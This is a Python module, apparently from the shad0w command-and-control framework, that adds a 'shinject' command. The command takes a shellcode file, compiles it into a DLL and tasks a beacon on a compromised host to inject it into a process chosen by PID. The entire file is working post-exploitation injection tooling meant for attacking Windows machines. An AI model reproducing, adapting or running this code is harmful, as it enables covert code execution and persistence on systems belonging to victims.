#
# Execute shellcode inside a process
#

import os
import json
import base64
import argparse
import threading

from lib import buildtools

__description__ = "Execute shellcode inside a process"
__author__ = "@_batsec_"

# identify the task as shellcode execute
DLLINJECT_EXEC_ID = 0x5000

# did the command error
ERROR = False
error_list = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def build_inject_info(args, rcode):

    # create the json object to tell the beacon
    # where to execute the code.

    info = {}

    info["pid"] = int(args.pid)
    info["dll"] = rcode

    return json.dumps(info)

def format_shellcode(shellcode):
    hshellcode = ""

    code_size = len(shellcode)

    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"

    return hshellcode

def write_header(code, file_loc):
    hex_code = format_shellcode(code)

    TEMPLATE = """unsigned char beacon_bin[] = { %s };
unsigned int beacon_bin_len = %s;
"""

    header = TEMPLATE % (hex_code, len(code))

    with open(file_loc, 'w') as file:
        file.write(header)

    return

def get_dll_data(file_loc):
    with open(file_loc, "rb") as file:
        data = file.read()

    return base64.b64encode(data).decode()

def generate_beacon_dll(shad0w, rcode):
    # write header file
    write_header(rcode, "/root/shad0w/modules/windows/shinject/beacon.h")

    # build the dll
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/", basedir="/root/shad0w/modules/windows/shinject/")
    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll", builddir=os.getcwd(), make_target="x64")

    # check that the dll has built
    if made != True:
        shad0w.debug.error("Error building migrate dll")
        return

    # return the base64 dll data
    return get_dll_data("/root/shad0w/modules/windows/shinject/module.dll")

def get_file_data(filename):

    # get the data from the file

    # so we are in the bridge
    bdir = os.getcwd()
    os.chdir("/root/shad0w/.bridge")

    try:
        with open(filename, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        return None

    # hop back to where we where before
    os.chdir(bdir)

    return data

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    # usage examples
    usage_examples = """

Examples:

shinject -p 8725 -f shellcode.bin
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='shinject',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-p", "--pid", required=True, help="PID to migrate to")
    parse.add_argument("-f", "--file", required=True, help="The DLL to inject")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if ERROR:
        print(error_list)
        parse.print_help()
        return

    # create the beacon
    rcode = get_file_data(args.file)

    # create the beacon dll
    rcode = generate_beacon_dll(shad0w, rcode)

    # make the json info
    inject_info = build_inject_info(args, rcode)

    # tell the beacon to execute the dll
    shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)

    return
